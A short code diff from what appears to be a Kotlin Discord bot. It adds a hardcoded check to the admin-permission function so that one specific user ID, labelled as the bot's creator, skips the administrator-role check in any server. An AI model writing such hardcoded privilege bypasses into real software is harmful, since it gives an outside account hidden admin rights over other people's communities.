@@ -65,6 +65,9 @@ suspend fun executeCommand(message: Message, context: BotContext) {
 
 suspend fun assertAdmin(message: Message, context: BotContext) {
     with(context) {
+        // bot creator: Streamer272#1523
+        if (message.author.id == "619963897872646168") return@assertAdmin
+
         val author = message.guild!!.getMember(message.authorId)
         val roles = message.guild!!.getRoles()
             .filter { it.permissions.contains(Permission.ADMINISTRATOR) }
